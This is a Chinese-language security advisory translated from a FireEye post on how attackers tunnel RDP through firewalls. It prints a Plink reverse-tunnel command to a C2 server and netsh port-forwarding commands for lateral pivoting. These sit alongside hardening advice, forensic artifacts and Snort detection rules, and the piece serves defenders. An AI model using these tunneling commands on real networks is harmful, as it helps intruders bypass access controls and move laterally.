**远程桌面服务是Windows的一个组件，各种公司都使用它来为系统管理员，运维人员和远程员工提供便利。另一方面，远程桌面服务，特别是远程桌面协议（RDP），也同样为网络攻击者提供了便利。当善于渗透的攻击者在目标网络中建立了立足点并获得充足的登录凭据时，他们可能会从后门切换到直接使用RDP会话进行远程访问。当攻击者通过合法流量进行远程访问时，入侵变得越来越难以检测。**

## 利用RDP突破网络访问规则

与非图形后门相比，攻击者更喜欢RDP的稳定性和功能性的优势，因为后门程序可能会在系统上留下不必要的痕迹。因此，FireEye常常能捕获到使用本机Windows
RDP远程桌面程序的攻击者在受限环境中跨系统进行的横向连接行为。传统意义上，受防火墙和NAT规则保护的非暴露公司网络通常被认为不容易受到入站RDP请求连接的影响。然而，攻击者越来越多地开始使用网络隧道和基于主机的端口转发来破坏这些网络访问控制规则。

网络隧道和端口转发利用防火墙的“缝隙”（不受防火墙保护的端口，允许应用程序访问受防火墙保护的网络中的主机服务）与防火墙阻止的远程服务器建立连接。一旦通过防火墙建立了与远程服务器的连接，该连接就可以用作传输机制，通过防火墙发送接收数据或建立“隧道”，在本地侦听服务（位于防火墙内），使远程服务器可以访问它们（位于防火墙外面），如图1所示。

![](https://image.3001.net/images/20190213/1550062134_5c6412365e8f5.png!small)

图1：利用RDP和SSH隧道突破企业防火墙的实例

## 入站RDP隧道

通常，用于建立RDP会话隧道的实用程序是PuTTY
Link，通常称为Plink。Plink可用于使用任意源和目标端口与其他系统建立安全SSH网络连接。由于许多网络环境要么不严格执行协议检查，要么不阻止从其网络出站的SSH通信，使得攻击者可以通过Plink创建加密隧道，允许受感染系统上的RDP端口与攻击者C2服务器进行通信。

Plink的常用命令：

    
    
    plink.exe <users>@<IP or domain> -pw <password> -P 22 -2 -4 -T -N -C -R 12345:127.0.0.1:3389

![](https://image.3001.net/images/20190213/1550062147_5c64124320ded.png!small)

图2 使用Plink成功创建RDP隧道

![](https://image.3001.net/images/20190213/1550062159_5c64124f719d5.png!small)

图3 攻击者利用受害者与C2服务器建立的隧道实现RDP会话

应该注意的是，对于能够访问目标网络RDP端口的攻击者，他们必须已能够通过其他的方式访问或进入目标网络，以便上传程序建立通信隧道。例如，攻击者可以从网络钓鱼电子邮件开始，通过恶意程序在目标网络中取得支点。在建立立足点后，逐步搜集相关凭据并提升权限。通过隧道建立RDP会话而进入受限网络环境是攻击者常用众多访问方法之一。

## 通过RDP跳板逐步渗透

RDP不仅是外部访问目标网络的完美工具，RDP会话还可以跨多个系统进行连接，以便在环境中横向移动。
FireEye观察到攻击者曾使用本机Windows自带的netsh网络命令，创建RDP端口转发，并以此作为访问另外受限网段的跳板。

netsh端口转发命令：

    
    
    netsh interface portproxy add v4tov4 listenport=8001 listenaddress=<JUMP BOX IP> connectport=3389 connectaddress=<DESTINATION IP>
    
    netsh I p a v l=8001 listena=<JUMP BOX IP> connectp=3389 c=<DESTINATION IP>

例如，攻击者可以配置跳板并在任意端口上侦听从先前网络发送的流量。然后，流量将通过跳板直接转发到其它网络上的任何系统，并使用指定端口，包括默认RDP端口TCP
3389。这种类型的RDP端口转发为攻击者提供了一种利用跳板而实现路由的方法。并且通过修改注册表，可以实现在RDP会话期间，不打断正在使用跳板的合法管理员。

![](https://image.3001.net/images/20190213/1550062169_5c641259bf77a.png!small)

图4 通过跳板向其它网段进行横向移动

## RDP隧道的预防和检测

如果启用了RDP，攻击者就可以通过隧道或端口转发实现横向移动并保持在目标网络的存在。为了减缓攻击行为和检测这些类型的RDP攻击，公司安全运维人员应该关注基于主机和基于网络的防护和检测机制。  

### 基于主机的防护：

> 远程桌面服务：在不需要远程连接的情况下，在所有终端用户工作站和系统上禁用远程桌面服务。
>
> 基于主机的防火墙：启用基于主机的防火墙规则，明确拒绝入站RDP连接。
>
> 本地帐户：通过启用“拒绝通过远程桌面服务登录”的安全设置，防止在工作站上使用本地帐户远程登录。

### 基于主机的检测：

 **注册表项：**

查看与Plink连接关联的注册表项，这些注册表项可能存储了用来识别特定的源和目的地址有关的信息。
默认情况下，PuTTY和Plink都会在Windows系统上的以下注册表项中存储会话信息和曾今连接过的ssh服务器：

    
    
    HKEY_CURRENT_USER\Software\SimonTatham\PuTTY
    
    HKEY_CURRENT_USER\SoftWare\SimonTatham\PuTTY\SshHostKeys

同样的，以下的Windows注册表项存储了使用netsh创建PortProxy配置：

    
    
    HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4

收集和查看这些注册表项可以识别合法和异常的SSH隧道活动。可能还需要进一步审查表项以确认每项信息的具体用途。

 **事件日志：**

查看完整的登录事件的日志。常见的RDP登录事件包含在Windows系统上的以下事件日志中：

    
    
    %systemroot%\Windows\System32\winevt\Logs\Microsoft-TerminalServices-LocalSessionmanagerOperational.evtx
    
    %systemroot%\Windows\System32\winevt\Logs\Security.evtx

“TerminalServices-LocalSessionManager”日志包含有标识为EID
21的本地或远程登录成功事件，并且含有之前成功连接过的RDP会话，标识为EID 25表示合法用户成功注销。“安全”日志包含有成功类型为10 ，标识为EID
4624的远程交互式登录（RDP）事件。记录为本地主机IP地址（127.0.0.1 -127.255.255.255）的源IP地址意味着攻击者可能使用端口转发程序建立隧道并登录3389端口

检查` plink.exe` 程序的执行痕迹。请注意，攻击者可以重命名程序名以避免检测。相关痕迹包括但不限于：

> Application Compatibility Cache/Shimcache 应用程序兼容性缓存
>
> Amcache Amcache.hve记录执应用程序的执行路径、上次执行时间、以及SHA1值
>
> Jump Lists Windows 7-10用来任务栏显示经常使用或最近使用的项目
>
> Prefetch 预读取
>
> Service Events 服务事件
>
> CCM Recently Used Apps from the WMI repository WMI库记录的最近使用CCM的应用程序
>
> Registry keys 注册表

### 基于网络的预防：

> 远程连接：在需要RDP连接的情况下，强制从指定的主机或集中管理服务器启动连接。
>
> 域帐户：对特权帐户（例如域管理员）和服务帐户使用“拒绝通过远程桌面服务登录”的安全设置，因为这些类型的帐户通常会被攻击者用于横向移动到网络中的敏感区域。

### 基于网络的检测：

>
> 防火墙规则：查看现有防火墙规则以确定存在端口转发漏洞的区域。除了预防使用端口转发程序之外，还应对环境中工作站之间的内部通信进行监控。通常，工作站不需要直接相互通信，并且可以使用防火墙规则来阻止任何此类通信，除非需要才放行。
>
>
> 网络流量：执行网络流量的内容和协议检查。并非所有给定端口上通信的流量都是正常的流量或者是协议相符的流量。例如，攻击者可以使用TCP端口80或443与远程服务器建立RDP隧道。深入检查网络流量可能会发现它实际上不是HTTP或HTTPS，而是完全不同的流量。因此，安全运维人员应密切监控其网络流量。
>
>
> Snort规则：当RDP通信连接的一方为特定的一些低端口时，有可能意味着有RDP隧道建立。下面提供了两个示例Snort规则，可以帮助安全团队来识别其网络流量中的RDP隧道。
    
    
    snort
    
    alert tcp any [21,22,23,25,53,80,443,8080] -> any !3389 (msg:"RDP - HANDSHAKE [Tunneled msts]"; dsize:<65; content:"|03 00 00|"; depth:3; content:"|e0|"; distance:2; within:1; content:"Cookie: mstshash="; distance:5; within:17; sid:1; rev:1;)
    
    alert tcp any [21,22,23,25,53,80,443,8080] -> any !3389 (msg:"RDP - HANDSHAKE [Tunneled]"; flow:established; content:"|c0 00|Duca"; depth:250; content:"rdpdr"; content:"cliprdr"; sid:2; rev:1;)

## 结论

RDP的出现为用户提供了更大的自由和互操作性。但随着越来越多的攻击者使用RDP跨越有访问限制的网络并进行横向移动，安全团队正面临着如何区分合法和恶意RDP流量的挑战。因此，应采取适当的基于主机和网络的预防和检测方法来主动监控并能够识别恶意RDP的使用情况。

 ***参考来源：[fireeye](https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html)，tahf编译整理，转载请注明来自 FreeBuf.COM。**

